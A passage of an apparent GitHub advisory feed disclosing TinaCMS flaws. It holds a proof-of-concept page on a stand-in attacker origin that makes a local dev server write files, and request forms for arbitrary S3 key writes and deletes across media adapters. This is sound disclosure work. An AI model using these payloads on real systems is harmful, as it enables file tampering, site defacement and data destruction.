            <uri>https://github.com/advisories/GHSA-p853-83gj-wjj3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-20T18:30:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@tinacms/cli] Tina: Cross-origin `POST /media/upload/*` requests can write arbitrary files into the Tina dev server media root]]></title>
        <id>https://github.com/advisories/GHSA-rgr9-r7mj-mf6x</id>
        <link href="https://github.com/advisories/GHSA-rgr9-r7mj-mf6x"/>
        <updated>2026-08-21T18:31:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A browser-based cross-origin request flaw in the Tina dev server allows an attacker-controlled website to cause arbitrary file creation inside the configured media upload directory on a developer machine running <code>tinacms dev</code>. No manual file upload is required. The attacker page builds the multipart request in JavaScript and sends it directly to the local Tina server. The browser blocks access to the response because of CORS, but the server still processes the request and writes the file.</p>
<h3 id="details">Details</h3>
<p>The issue is in the dev server path of <code>@tinacms/cli</code>.</p>
<p>The Vite dev server installs CORS middleware:</p>
<pre><code class="language-ts">// packages/@tinacms/cli/src/next/vite/plugins.ts
server.middlewares.use(
  cors({
    origin: corsOriginCheck,
    methods: ['GET', 'HEAD', 'PUT', 'PATCH', 'POST', 'DELETE'],
  })
);
</code></pre>
<p>For disallowed origins, the origin callback only returns <code>false</code> to the CORS library:</p>
<pre><code class="language-ts">// packages/@tinacms/cli/src/next/vite/cors.ts
return (origin, callback) =&gt; {
  ...
  callback(null, false);
};
</code></pre>
<p>That does not reject the request server-side. The same request is still routed into the upload handler:</p>
<pre><code class="language-ts">// packages/@tinacms/cli/src/next/vite/plugins.ts
if (req.url.startsWith('/media/upload')) {
  await mediaRouter.handlePost(req, res);
  return;
}
</code></pre>
<p>The upload handler then accepts attacker-controlled path and body data and writes the file:</p>
<pre><code class="language-ts">// packages/@tinacms/cli/src/next/commands/dev-command/server/media.ts
bb.on('file', async (_name, file, _info) =&gt; {
  const fullPath = decodeURIComponent(
    req.url?.slice('/media/upload/'.length)
  );
  const saveTo = resolveStrictlyWithinBase(fullPath, mediaFolder);
  await fs.ensureDir(path.dirname(saveTo));
  file.pipe(fs.createWriteStream(saveTo));
});
</code></pre>
<p>This is exploitable because <code>multipart/form-data</code> is a simple browser request and does not require a preflight. CORS only prevents the attacking page from reading the response; it does not stop the local Tina server from processing the state-changing request.</p>
<p>I validated this locally with a browser-backed repro:</p>
<ul>
<li>the request origin was a disallowed non-localhost origin,</li>
<li>the browser treated the fetch as blocked,</li>
<li>the local Tina media file was still written with attacker-controlled contents.</li>
</ul>
<p>The demonstrated impact is limited to arbitrary file creation inside the configured Tina media root. I did not demonstrate traversal outside that directory or code execution.</p>
<h3 id="poc">PoC</h3>
<p>Minimal reproduction:</p>
<ol>
<li>Start a Tina dev server so the media upload route is reachable at:</li>
</ol>
<pre><code class="language-text">http://127.0.0.1:&lt;TINA_PORT&gt;/media/upload/&lt;filename&gt;
</code></pre>
<ol start="2">
<li>From a different, non-allowed origin such as <code>http://evil.test:8000</code>, serve this page:</li>
</ol>
<pre><code class="language-html">&lt;!doctype html&gt;
&lt;script&gt;
(async () =&gt; {
  const form = new FormData();
  form.append(
    'file',
    new Blob(['poc-from-cross-origin'], { type: 'text/plain' }),
    'poc.txt'
  );

  try {
    await fetch('http://127.0.0.1:&lt;TINA_PORT&gt;/media/upload/poc.txt', {
      method: 'POST',
      body: form,
    });
    console.log('fetch resolved');
  } catch {
    console.log('fetch blocked by CORS');
  }
})();
&lt;/script&gt;
</code></pre>
<ol start="3">
<li><p>Open that page in a browser while the Tina dev server is running.</p>
</li>
<li><p>Observe:</p>
</li>
</ol>
<ul>
<li>the browser reports the cross-origin request as blocked or inaccessible,</li>
<li>but <code>poc.txt</code> is still created in the configured media directory, commonly:</li>
</ul>
<pre><code class="language-text">public/uploads/poc.txt
</code></pre>
<ol start="5">
<li>Verify the file contents are:</li>
</ol>
<pre><code class="language-text">poc-from-cross-origin
</code></pre>
<p>This reproduces the vulnerability without any victim-side manual upload action.</p>
<h3 id="impact">Impact</h3>
<p>This is a browser-mediated arbitrary file write into the Tina dev server’s configured media root. The affected population is developers or operators running the local Tina dev server and visiting an attacker-controlled webpage. The demonstrated impact is integrity impact on local project files under the upload root. I did not demonstrate write outside the media root, GraphQL mutation CSRF, or code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tinacms/tinacms/security/advisories/GHSA-rgr9-r7mj-mf6x">https://github.com/tinacms/tinacms/security/advisories/GHSA-rgr9-r7mj-mf6x</a></li>
<li><a href="https://github.com/tinacms/tinacms/pull/7111">https://github.com/tinacms/tinacms/pull/7111</a></li>
<li><a href="https://github.com/tinacms/tinacms/commit/211997cdb53cbd43638bdee999faa65375cfc260">https://github.com/tinacms/tinacms/commit/211997cdb53cbd43638bdee999faa65375cfc260</a></li>
<li><a href="https://github.com/tinacms/tinacms/releases/tag/@tinacms/cli@2.5.2">https://github.com/tinacms/tinacms/releases/tag/@tinacms/cli@2.5.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63123">https://nvd.nist.gov/vuln/detail/CVE-2026-63123</a></li>
<li><a href="https://github.com/advisories/GHSA-rgr9-r7mj-mf6x">https://github.com/advisories/GHSA-rgr9-r7mj-mf6x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgr9-r7mj-mf6x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-19T21:56:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next-tinacms-cloudinary] Tina: Broken Access Control: arbitrary bucket-key write/delete in `next-tinacms-s3` (and sibling production media adapters)]]></title>
        <id>https://github.com/advisories/GHSA-8mq9-5fw2-5rm4</id>
        <link href="https://github.com/advisories/GHSA-8mq9-5fw2-5rm4"/>
        <updated>2026-08-21T18:31:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The production media handler shipped by <code>next-tinacms-s3</code> (<code>createMediaHandler</code> in <code>packages/next-tinacms-s3/src/handlers.ts</code>) accepts an attacker-chosen <code>?key=</code> query parameter and returns an AWS-signed <code>PutObject</code> URL whose <code>Key</code> is that value, with no check that the key falls under the operator's configured <code>mediaRoot</code>. The same handler's <code>DELETE</code> branch reads <code>objectKey = (req.query.media as string[])[1]</code> and dispatches a <code>DeleteObjectCommand</code> for that exact key, again unbounded by <code>mediaRoot</code>. Any caller that passes the operator-supplied <code>authorized()</code> predicate — i.e. any logged-in CMS editor in a typical TinaCloud / self-hosted deployment — therefore has write and delete authority over the <em>entire</em> S3 bucket the IAM key can reach, even though the package documents <code>mediaRoot</code> as the place where editors are scoped. The same shape is present in <code>next-tinacms-dos</code>, <code>next-tinacms-azure</code>, and <code>next-tinacms-cloudinary</code>, so a single design mistake spans every first-party production media backend.</p>
<ul>
<li>Project: TinaCMS — first-party production media adapters (consumed by self-hosted Next.js sites and TinaCloud-backed deployments).</li>
<li>Source reviewed: <code>tinacms/tinacms</code> @ <code>main</code> (<code>b56dad4</code>).</li>
<li>Deployed artefact validated: <code>next-tinacms-s3@21.0.3</code> handler logic, exercised against <code>@aws-sdk/client-s3@3.665.x</code> via <code>aws-sdk-client-mock@4.1.0</code> (the AWS SDK signs the URL identically whether the bucket is real or mocked).</li>
<li>Affected file(s):<ul>
<li><code>packages/next-tinacms-s3/src/handlers.ts:67-90</code> — <code>GET ?key=</code> returns presigned <code>PutObjectCommand</code> URL with attacker-chosen <code>Key</code>.</li>
<li><code>packages/next-tinacms-s3/src/handlers.ts:199-223</code> — <code>DELETE</code> reads <code>[, objectKey] = media</code> and issues <code>DeleteObjectCommand</code> against attacker-chosen <code>Key</code>.</li>
<li><code>packages/next-tinacms-dos/src/handlers.ts:79-152</code> and <code>:249-278</code> — same write/delete pattern, plus a server-side upload that builds the key with <code>path.join(mediaRoot, prefix + filename)</code> over attacker-controlled <code>directory</code> and <code>filename</code>.</li>
<li><code>packages/next-tinacms-azure/src/handlers.ts:44-95</code> — <code>uploadMedia</code> writes <code>path.join(directory, filename)</code> with both fields attacker-controlled (no <code>mediaRoot</code> configured at all); <code>deleteAsset</code> deletes any blob in the container.</li>
<li><code>packages/next-tinacms-cloudinary/src/handlers.ts:193-204</code> — <code>cloudinary.uploader.destroy(public_id)</code> over attacker-chosen <code>public_id</code>.</li>
</ul>
</li>
<li>CWE: CWE-639 — Authorization Bypass Through User-Controlled Key. Adjacent: CWE-284 (Improper Access Control), CWE-862 (Missing Authorization on the per-key authority check).</li>
<li>OWASP 2021: <strong>A01:2021 — Broken Access Control</strong> (the operator's intended <code>mediaRoot</code> boundary is enforced only on listing, not on writes or deletes). Secondary: A04:2021 — Insecure Design (every adapter independently re-implements the same broken pattern).</li>
</ul>
<h2 id="vulnerable-code">Vulnerable code</h2>
<p><code>packages/next-tinacms-s3/src/handlers.ts:39-98</code>:</p>
<pre><code class="language-ts">export const createMediaHandler = (config: S3Config, options?: S3Options) =&gt; {
  const client = new S3Client(config.config);
  const bucket = config.bucket;
  let mediaRoot = config.mediaRoot || '';                 // (1)
  if (mediaRoot) { /* normalise to "media/" form */ }

  return async (req: NextApiRequest, res: NextApiResponse) =&gt; {
    const isAuthorized = await config.authorized(req, res);
    if (!isAuthorized) {
      res.status(401).json({ message: 'sorry this user is unauthorized' });
      return;
    }
    switch (req.method) {
      case 'GET':
        if (req.query.key) {
          const expiresIn: number =
            (req.query.expiresIn &amp;&amp; Number(req.query.expiresIn)) || 3600; // (2)
          const s3_key = req.query.key
            ? Array.isArray(req.query.key) ? req.query.key[0] : req.query.key
            : null;
          if (!s3_key) return res.status(400).json({ message: 'key is required' });
          if (await keyExists(client, bucket, s3_key)) {
            return res.status(400).json({ message: 'key already exists' }); // (3)
          }
          const signedUrl = await getUploadUrl(bucket, s3_key, expiresIn, client); // (4)
          return res.json({ signedUrl, src: cdnUrl + s3_key });
        }
        return listMedia(req, res, client, bucket, mediaRoot, cdnUrl);     // (5)
      case 'DELETE':
        return deleteAsset(req, res, client, bucket);                      // (6)
</code></pre>
<p><code>packages/next-tinacms-s3/src/handlers.ts:199-223</code>:</p>
<pre><code class="language-ts">async function deleteAsset(req, res, client, bucket) {
  const { media } = req.query;
  const [, objectKey] = media as string[];                                  // (7)
  const params: DeleteObjectCommandInput = { Bucket: bucket, Key: objectKey };
  const command = new DeleteObjectCommand(params);
  ...
}
</code></pre>
<p>At <strong>(1)</strong> the operator configures <code>mediaRoot</code> (e.g. <code>"media/"</code>), and the package's <code>README</code> documents this as the directory the IAM key is scoped to. At <strong>(4)</strong> the handler signs a <code>PutObjectCommand</code> with <code>Key: s3_key</code> taken verbatim from <code>req.query.key</code>. Nothing between (1) and (4) verifies that <code>s3_key</code> starts with <code>mediaRoot</code>, so any path the IAM key can reach is fair game. The only filter is the <code>keyExists</code> check at <strong>(3)</strong>, which prevents <em>overwrite</em> of an existing object but not creation of arbitrary new ones (and not overwrite of objects the IAM key cannot <code>HeadObject</code>). At <strong>(2)</strong> the validity window of the produced URL is also attacker-controlled, capped only by AWS SigV4's 7-day hard limit. At <strong>(5)</strong> the <em>list</em> path <strong>does</strong> prefix-join <code>mediaRoot</code> (<code>Prefix: mediaRoot ? path.join(mediaRoot, prefix) : prefix</code>), demonstrating that the boundary was understood to exist — it just isn't enforced on writes. At <strong>(6)</strong> + <strong>(7)</strong> delete extracts the second URL segment into <code>objectKey</code> with no prefix check, so <code>DELETE /api/s3/media/x/anything-in-the-bucket</code> is a valid arbitrary-key delete primitive.</p>
<p>For contrast, the same package's <code>listMedia</code> (line 139) does write <code>Prefix: mediaRoot ? path.join(mediaRoot, prefix) : prefix</code>, and <code>stripMediaRoot</code> (line 100) exists explicitly to peel <code>mediaRoot</code> off keys returned to the client — so the codebase models <code>mediaRoot</code> as a security boundary on the read side. The write and delete sides simply forgot to apply it.</p>
<p>The same misalignment is duplicated in three sibling packages:</p>
<ul>
<li><code>packages/next-tinacms-dos/src/handlers.ts:115-125</code> — upload builds <code>Key: mediaRoot ? path.join(mediaRoot, prefix + filename) : prefix + filename</code> over attacker-controlled <code>prefix</code> (from <code>req.body.directory</code>) and <code>filename</code> (from <code>multer</code>'s <code>file.originalname</code>); <code>path.join</code> collapses <code>..</code> segments, so a <code>directory</code> of <code>../..</code> plus a chosen <code>filename</code> lands at any key in the bucket. Lines 249-278 reproduce the S3 delete-by-second-segment pattern.</li>
<li><code>packages/next-tinacms-azure/src/handlers.ts:44-95</code> — <code>uploadMedia</code> writes a blob at <code>path.join(directory, filename)</code> with both values straight out of <code>formData</code>. <code>next-tinacms-azure</code> has no <code>mediaRoot</code> config at all (<code>AzureBlobStorageConfig</code> in <code>src/types.ts</code>), so the entire container is writable / deletable by any authorized user.</li>
<li><code>packages/next-tinacms-cloudinary/src/handlers.ts:193-204</code> — <code>deleteAsset</code> calls <code>cloudinary.uploader.destroy(public_id)</code> over the attacker-chosen second segment, deleting any asset in the cloud. The same handler's <code>listMedia</code> (line 110) interpolates <code>mediaListOptions.directory</code> directly into a Cloudinary search-expression DSL string (<code>folder="${directory}"</code>), giving an authorized user full search-expression injection — out of scope for this finding but worth a separate report.</li>
</ul>
<h2 id="reproduction-validated-locally">Reproduction (validated locally)</h2>
<p>Environment: Node 22, <code>@aws-sdk/client-s3@3.665.0</code>, <code>@aws-sdk/s3-request-presigner@3.665.0</code>, <code>aws-sdk-client-mock@4.1.0</code>. The harness vendors <code>createMediaHandler</code> byte-for-byte from <code>packages/next-tinacms-s3/src/handlers.ts</code> and runs it against a mocked <code>S3Client</code>. The AWS SDK signs the URL identically whether the bucket exists — the resulting URL is the same one a real S3 deployment would hand back to the editor's browser, so it would PUT against a real bucket without further help.</p>
<p>PoC layout under <code>/Users/admin/joplin_research/tinacms-s3-poc/</code>:</p>
<pre><code>package.json            (deps only)
handler-vendored.mjs    (verbatim copy of createMediaHandler, types stripped)
poc.mjs                 (four exhibits exercising the handler)
</code></pre>
<p>Handler is configured the way the package's <code>README</code> documents:</p>
<pre><code class="language-js">const handler = createMediaHandler({
  config: { region: 'us-east-1', credentials: { accessKeyId: '…', secretAccessKey: '…' } },
  bucket: 'editor-media-bucket',
  mediaRoot: 'media',                 // editors are "scoped to media/"
  authorized: async () =&gt; true,       // typical wiring: TinaCloud verified user
});
</code></pre>
<p>Run:</p>
<pre><code class="language-bash">$ cd /Users/admin/tinacms-s3-poc &amp;&amp; node poc.mjs
--- Exhibit A: presigned PUT URL for arbitrary bucket key ---
  HTTP status : 200
  signedUrl   : https://editor-media-bucket.s3.us-east-1.amazonaws.com/index.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&amp;X-Amz-Credential=AKIAFA...
  src         : https://editor-media-bucket.s3.us-east-1.amazonaws.com/index.html
  signed Key  : /index.html
  RESULT      : BYPASS  (signed URL writes outside media/)

--- Exhibit B: cross-tenant overwrite via attacker-chosen key ---
  signed Key  : /tenant-victim/posts/announcement.mdx
  RESULT      : BYPASS  (cross-tenant write primitive granted)

--- Exhibit C: arbitrary-key DELETE via [...media] route ---
  HTTP status : 200
  S3 Bucket   : editor-media-bucket
  S3 Key      : tenant-victim/posts/announcement.mdx
  RESULT      : BYPASS  (arbitrary-key DELETE granted)

--- Exhibit D: attacker-controlled ?expiresIn ---
  X-Amz-Expires: 604800 sec
  RESULT       : BYPASS  (URL valid far longer than the 1h default)
</code></pre>
<p>Verification, in detail:</p>
<ol>
<li><p><strong>Exhibit A</strong> — <code>GET /api/s3/media?key=index.html</code>. <code>mediaRoot=media/</code> is configured but never consulted on the write path. The handler hands back a SigV4 URL whose path is <code>/index.html</code>. PUT'ing any body to that URL would create the bucket-root object <code>index.html</code> against the operator's IAM credentials. For a deployment that fronts the bucket with CloudFront / S3-website hosting, this is a one-shot site-defacement primitive (and, for any CSP that trusts the bucket, a one-shot stored-XSS primitive against the published site).</p>
</li>
<li><p><strong>Exhibit B</strong> — same primitive, attacker-chosen key <code>tenant-victim/posts/announcement.mdx</code>. In the multi-tenant TinaCloud / TinaCMS Cloud deployment shape (one bucket shared across tenants, each tenant assigned a <code>mediaRoot/&lt;tenant&gt;/</code> prefix), a Tenant A editor receives a presigned PUT URL for any Tenant B key. Cross-tenant content tampering with no further bug needed.</p>
</li>
<li><p><strong>Exhibit C</strong> — <code>DELETE /api/s3/media/anything-here-is-ignored/tenant-victim%2Fposts%2Fannouncement.mdx</code>. The handler reads the catch-all as <code>req.query.media = ['anything-here-is-ignored', 'tenant-victim/posts/announcement.mdx']</code>, destructures to <code>objectKey = media[1]</code>, dispatches <code>DeleteObjectCommand({ Bucket: 'editor-media-bucket', Key: 'tenant-victim/posts/announcement.mdx' })</code>. The mock confirms the captured command's <code>Key</code> is the attacker-supplied string. Real S3 will honour the same call. (The mock-captured call confirms the <em>handler's</em> behaviour; the real S3 call requires only <code>s3:DeleteObject</code> on the bucket, which the package's <code>README</code> instructs operators to grant.)</p>
</li>
<li><p><strong>Exhibit D</strong> — <code>?expiresIn=604800</code> (7 days, the SigV4 ceiling). The handler accepts it, the resulting <code>X-Amz-Expires=604800</code>. Combined with Exhibit A, an attacker who briefly compromises a CMS session (e.g. via a stolen idle browser session or the dev-server CSRF write described in finding 06) can mint a long-lived offline write primitive — usable for a week with no further interaction with the CMS.</p>
</li>
</ol>
<p>The four exhibits together: cross-mediaRoot write, cross-tenant write, arbitrary-key delete, and long-lived signed-URL minting.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Cross-tenant / cross-mediaRoot write.</strong> In any deployment where the bucket holds anything other than this one editor's <code>mediaRoot</code> (multi-tenant TinaCloud, shared corporate bucket, bucket-backed static site), an authorized editor obtains write authority over every key the IAM credential can reach. Concretely: defacement of a static site fronted by the bucket; cross-tenant content tampering; replacement of <code>*.html</code>, <code>*.js</code>, <code>*.json</code> assets that downstream consumers trust. (Exhibits A, B; <code>handlers.ts:67-90</code>.)</li>
<li><strong>Stored XSS via uploaded HTML.</strong> S3 returns objects with the <code>Content-Type</code> the upload supplies. The presigned <code>PutObjectCommand</code> URL carries no <code>Content-Type</code> constraint — the attacker's <code>PUT</code> chooses it. An editor can therefore write an HTML / SVG / JS payload to the bucket-root, and any CDN or origin that serves bucket objects directly to an authenticated SaaS surface inherits stored XSS in that origin.</li>
<li><strong>Arbitrary-key delete (data destruction).</strong> Through <code>[...media]</code> the handler treats the second URL segment as a free-form object key. An editor can wipe any object the IAM key can <code>s3:DeleteObject</code>, including non-media artefacts like deployment manifests, backups, or other tenants' files. (Exhibit C; <code>handlers.ts:199-223</code>.)</li>
<li><strong>Bucket-policy implications.</strong> The <code>README</code> (lines 38-90) tells operators to grant the IAM key <code>s3:PutObject</code>, <code>s3:PutObjectAcl</code>, <code>s3:DeleteObject</code>, and <code>s3:ListBucket</code> on the <em>whole</em> bucket. The README implies the application code constrains the editor's actions to <code>mediaRoot</code>. Because the application code does not, every operator who follows the README has — without realising — granted every CMS editor full write/delete on the whole bucket.</li>
<li><strong>Long-lived offline write primitive.</strong> <code>expiresIn</code> is attacker-controlled and not capped by the handler. A single GET request mints a URL valid for up to 7 days (AWS SigV4 ceiling). An attacker who briefly compromises a CMS session can stash one such URL and continue writing arbitrary objects long after the session is revoked. (Exhibit D.)</li>
<li><strong>Same-shape exposure on every other first-party media adapter.</strong> <code>next-tinacms-dos</code> (DigitalOcean Spaces, S3-compatible), <code>next-tinacms-azure</code> (Blob Storage), and <code>next-tinacms-cloudinary</code> (Cloudinary) all duplicate the broken pattern. Azure has <em>no</em> mediaRoot config at all, so the boundary that <code>next-tinacms-s3</code> advertises but doesn't enforce isn't even nominally present in <code>next-tinacms-azure</code>.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tinacms/tinacms/security/advisories/GHSA-8mq9-5fw2-5rm4">https://github.com/tinacms/tinacms/security/advisories/GHSA-8mq9-5fw2-5rm4</a></li>
<li><a href="https://github.com/tinacms/tinacms/pull/7088">https://github.com/tinacms/tinacms/pull/7088</a></li>
<li><a href="https://github.com/tinacms/tinacms/commit/d44558e9b4502d4f4fc2c970d22985339fe2b6ce">https://github.com/tinacms/tinacms/commit/d44558e9b4502d4f4fc2c970d22985339fe2b6ce</a></li>
<li><a href="https://github.com/tinacms/tinacms/releases/tag/next-tinacms-s3@23.0.4">https://github.com/tinacms/tinacms/releases/tag/next-tinacms-s3@23.0.4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59992">https://nvd.nist.gov/vuln/detail/CVE-2026-59992</a></li>
<li><a href="https://github.com/advisories/GHSA-8mq9-5fw2-5rm4">https://github.com/advisories/GHSA-8mq9-5fw2-5rm4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8mq9-5fw2-5rm4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-19T21:56:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next-tinacms-azure] Tina: Broken Access Control: arbitrary bucket-key write/delete in `next-tinacms-s3` (and sibling production media adapters)]]></title>
        <id>https://github.com/advisories/GHSA-8mq9-5fw2-5rm4</id>
        <link href="https://github.com/advisories/GHSA-8mq9-5fw2-5rm4"/>
        <updated>2026-08-21T18:31:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The production media handler shipped by <code>next-tinacms-s3</code> (<code>createMediaHandler</code> in <code>packages/next-tinacms-s3/src/handlers.ts</code>) accepts an attacker-chosen <code>?key=</code> query parameter and returns an AWS-signed <code>PutObject</code> URL whose <code>Key</code> is that value, with no check that the key falls under the operator's configured <code>mediaRoot</code>. The same handler's <code>DELETE</code> branch reads <code>objectKey = (req.query.media as string[])[1]</code> and dispatches a <code>DeleteObjectCommand</code> for that exact key, again unbounded by <code>mediaRoot</code>. Any caller that passes the operator-supplied <code>authorized()</code> predicate — i.e. any logged-in CMS editor in a typical TinaCloud / self-hosted deployment — therefore has write and delete authority over the <em>entire</em> S3 bucket the IAM key can reach, even though the package documents <code>mediaRoot</code> as the place where editors are scoped. The same shape is present in <code>next-tinacms-dos</code>, <code>next-tinacms-azure</code>, and <code>next-tinacms-cloudinary</code>, so a single design mistake spans every first-party production media backend.</p>
<ul>
<li>Project: TinaCMS — first-party production media adapters (consumed by self-hosted Next.js sites and TinaCloud-backed deployments).</li>
<li>Source reviewed: <code>tinacms/tinacms</code> @ <code>main</code> (<code>b56dad4</code>).</li>
<li>Deployed artefact validated: <code>next-tinacms-s3@21.0.3</code> handler logic, exercised against <code>@aws-sdk/client-s3@3.665.x</code> via <code>aws-sdk-client-mock@4.1.0</code> (the AWS SDK signs the URL identically whether the bucket is real or mocked).</li>
<li>Affected file(s):<ul>
<li><code>packages/next-tinacms-s3/src/handlers.ts:67-90</code> — <code>GET ?key=</code> returns presigned <code>PutObjectCommand</code> URL with attacker-chosen <code>Key</code>.</li>
<li><code>packages/next-tinacms-s3/src/handlers.ts:199-223</code> — <code>DELETE</code> reads <code>[, objectKey] = media</code> and issues <code>DeleteObjectCommand</code> against attacker-chosen <code>Key</code>.</li>
<li><code>packages/next-tinacms-dos/src/handlers.ts:79-152</code> and <code>:249-278</code> — same write/delete pattern, plus a server-side upload that builds the key with <code>path.join(mediaRoot, prefix + filename)</code> over attacker-controlled <code>directory</code> and <code>filename</code>.</li>
<li><code>packages/next-tinacms-azure/src/handlers.ts:44-95</code> — <code>uploadMedia</code> writes <code>path.join(directory, filename)</code> with both fields attacker-controlled (no <code>mediaRoot</code> configured at all); <code>deleteAsset</code> deletes any blob in the container.</li>
<li><code>packages/next-tinacms-cloudinary/src/handlers.ts:193-204</code> — <code>cloudinary.uploader.destroy(public_id)</code> over attacker-chosen <code>public_id</code>.</li>
</ul>
</li>
<li>CWE: CWE-639 — Authorization Bypass Through User-Controlled Key. Adjacent: CWE-284 (Improper Access Control), CWE-862 (Missing Authorization on the per-key authority check).</li>
<li>OWASP 2021: <strong>A01:2021 — Broken Access Control</strong> (the operator's intended <code>mediaRoot</code> boundary is enforced only on listing, not on writes or deletes). Secondary: A04:2021 — Insecure Design (every adapter independently re-implements the same broken pattern).</li>
</ul>
<h2 id="vulnerable-code">Vulnerable code</h2>
<p><code>packages/next-tinacms-s3/src/handlers.ts:39-98</code>:</p>
<pre><code class="language-ts">export const createMediaHandler = (config: S3Config, options?: S3Options) =&gt; {
  const client = new S3Client(config.config);
  const bucket = config.bucket;
  let mediaRoot = config.mediaRoot || '';                 // (1)
  if (mediaRoot) { /* normalise to "media/" form */ }

  return async (req: NextApiRequest, res: NextApiResponse) =&gt; {
    const isAuthorized = await config.authorized(req, res);
    if (!isAuthorized) {
      res.status(401).json({ message: 'sorry this user is unauthorized' });
      return;
    }
    switch (req.method) {
      case 'GET':
        if (req.query.key) {
          const expiresIn: number =
            (req.query.expiresIn &amp;&amp; Number(req.query.expiresIn)) || 3600; // (2)
          const s3_key = req.query.key
            ? Array.isArray(req.query.key) ? req.query.key[0] : req.query.key
            : null;
          if (!s3_key) return res.status(400).json({ message: 'key is required' });
          if (await keyExists(client, bucket, s3_key)) {
            return res.status(400).json({ message: 'key already exists' }); // (3)
          }
          const signedUrl = await getUploadUrl(bucket, s3_key, expiresIn, client); // (4)
          return res.json({ signedUrl, src: cdnUrl + s3_key });
        }
        return listMedia(req, res, client, bucket, mediaRoot, cdnUrl);     // (5)
      case 'DELETE':
        return deleteAsset(req, res, client, bucket);                      // (6)
</code></pre>
<p><code>packages/next-tinacms-s3/src/handlers.ts:199-223</code>:</p>
<pre><code class="language-ts">async function deleteAsset(req, res, client, bucket) {
  const { media } = req.query;
  const [, objectKey] = media as string[];                                  // (7)
  const params: DeleteObjectCommandInput = { Bucket: bucket, Key: objectKey };
  const command = new DeleteObjectCommand(params);
  ...
}
</code></pre>
<p>At <strong>(1)</strong> the operator configures <code>mediaRoot</code> (e.g. <code>"media/"</code>), and the package's <code>README</code> documents this as the directory the IAM key is scoped to. At <strong>(4)</strong> the handler signs a <code>PutObjectCommand</code> with <code>Key: s3_key</code> taken verbatim from <code>req.query.key</code>. Nothing between (1) and (4) verifies that <code>s3_key</code> starts with <code>mediaRoot</code>, so any path the IAM key can reach is fair game. The only filter is the <code>keyExists</code> check at <strong>(3)</strong>, which prevents <em>overwrite</em> of an existing object but not creation of arbitrary new ones (and not overwrite of objects the IAM key cannot <code>HeadObject</code>). At <strong>(2)</strong> the validity window of the produced URL is also attacker-controlled, capped only by AWS SigV4's 7-day hard limit. At <strong>(5)</strong> the <em>list</em> path <strong>does</strong> prefix-join <code>mediaRoot</code> (<code>Prefix: mediaRoot ? path.join(mediaRoot, prefix) : prefix</code>), demonstrating that the boundary was understood to exist — it just isn't enforced on writes. At <strong>(6)</strong> + <strong>(7)</strong> delete extracts the second URL segment into <code>objectKey</code> with no prefix check, so <code>DELETE /api/s3/media/x/anything-in-the-bucket</code> is a valid arbitrary-key delete primitive.</p>
<p>For contrast, the same package's <code>listMedia</code> (line 139) does write <code>Prefix: mediaRoot ? path.join(mediaRoot, prefix) : prefix</code>, and <code>stripMediaRoot</code> (line 100) exists explicitly to peel <code>mediaRoot</code> off keys returned to the client — so the codebase models <code>mediaRoot</code> as a security boundary on the read side. The write and delete sides simply forgot to apply it.</p>
<p>The same misalignment is duplicated in three sibling packages:</p>
<ul>
<li><code>packages/next-tinacms-dos/src/handlers.ts:115-125</code> — upload builds <code>Key: mediaRoot ? path.join(mediaRoot, prefix + filename) : prefix + filename</code> over attacker-controlled <code>prefix</code> (from <code>req.body.directory</code>) and <code>filename</code> (from <code>multer</code>'s <code>file.originalname</code>); <code>path.join</code> collapses <code>..</code> segments, so a <code>directory</code> of <code>../..</code> plus a chosen <code>filename</code> lands at any key in the bucket. Lines 249-278 reproduce the S3 delete-by-second-segment pattern.</li>
<li><code>packages/next-tinacms-azure/src/handlers.ts:44-95</code> — <code>uploadMedia</code> writes a blob at <code>path.join(directory, filename)</code> with both values straight out of <code>formData</code>. <code>next-tinacms-azure</code> has no <code>mediaRoot</code> config at all (<code>AzureBlobStorageConfig</code> in <code>src/types.ts</code>), so the entire container is writable / deletable by any authorized user.</li>
<li><code>packages/next-tinacms-cloudinary/src/handlers.ts:193-204</code> — <code>deleteAsset</code> calls <code>cloudinary.uploader.destroy(public_id)</code> over the attacker-chosen second segment, deleting any asset in the cloud. The same handler's <code>listMedia</code> (line 110) interpolates <code>mediaListOptions.directory</code> directly into a Cloudinary search-expression DSL string (<code>folder="${directory}"</code>), giving an authorized user full search-expression injection — out of scope for this finding but worth a separate report.</li>
</ul>
<h2 id="reproduction-validated-locally">Reproduction (validated locally)</h2>
<p>Environment: Node 22, <code>@aws-sdk/client-s3@3.665.0</code>, <code>@aws-sdk/s3-request-presigner@3.665.0</code>, <code>aws-sdk-client-mock@4.1.0</code>. The harness vendors <code>createMediaHandler</code> byte-for-byte from <code>packages/next-tinacms-s3/src/handlers.ts</code> and runs it against a mocked <code>S3Client</code>. The AWS SDK signs the URL identically whether the bucket exists — the resulting URL is the same one a real S3 deployment would hand back to the editor's browser, so it would PUT against a real bucket without further help.</p>
<p>PoC layout under <code>/Users/admin/joplin_research/tinacms-s3-poc/</code>:</p>
<pre><code>package.json            (deps only)
handler-vendored.mjs    (verbatim copy of createMediaHandler, types stripped)
poc.mjs                 (four exhibits exercising the handler)
</code></pre>
<p>Handler is configured the way the package's <code>README</code> documents:</p>
<pre><code class="language-js">const handler = createMediaHandler({
  config: { region: 'us-east-1', credentials: { accessKeyId: '…', secretAccessKey: '…' } },
